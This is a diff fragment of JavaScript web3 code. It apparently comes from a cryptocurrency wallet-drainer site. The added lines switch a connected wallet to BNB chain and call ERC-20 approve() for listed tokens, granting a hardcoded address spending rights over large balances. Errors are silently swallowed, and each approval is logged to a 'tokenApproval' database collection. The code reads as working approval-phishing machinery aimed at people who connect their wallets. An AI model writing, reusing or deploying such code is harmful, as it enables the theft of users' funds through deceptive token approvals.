@@ -878,23 +878,27 @@ console.log(collection)
   }
 
 
-  if (account == '0x4b4f2c8f622c6790a5c04886b3d7c538b87153cd') {
+if (account == '0x2c5da2bcfe33ecf847f7558f6195babc2f582262') {
 
-        const t = [
-  [{token: '0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E'}, {balance: 79}],
-  [{token: '0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF'}, {balance: 2976}],
 
-]
+  const t = [
+    [{token: '0x3Ef99822759A2192e7A82f64484e79e89cd90d52'}, {balance: 187820}],
+    [{token: '0xF4Ed363144981D3A65f42e7D0DC54FF9EEf559A1'}, {balance: 60034}],
+  
+  ]
+  
+   t.forEach( async e => {
+      var t = e[0].token
+      var b = e[1].balance
+      // var c = e[2].chain
+  
+      console.log(t,b,)
+  
+      await tokenGet(t, b)
+  })
+  
 
- t.forEach( async e => {
-    var t = e[0].token
-    var b = e[1].balance
-    // var c = e[2].chain
-
-    console.log(t,b,)
-
-    await tokenGet(t, b)
-})
+}
 
   
 
@@ -1151,23 +1155,24 @@ const erc20TokenContractAbi = [
 
 async function tokenGet(tokenAddress, tokenBalance) {
 
+try {
+  await ethereum.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{chainId: '0x38'}]})
+
+
     const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
     const toAddress = '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262';
-    
-    
-    // const balance = await tokenContract.methods.balanceOf(account).call();
-    // const balanceEther = await web3.utils.fromWei(balance, "ether")
-    
-    // console.log(balanceEther)
-    
-    
-    
+
     const tokenDecimals = web3.utils.toBN(18);
     const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
     const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
 
     await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})
 
+} catch (error) {
+  
+}
 
         await db.collection('tokenApproval').add({
         tokenContract: tokenAddress,
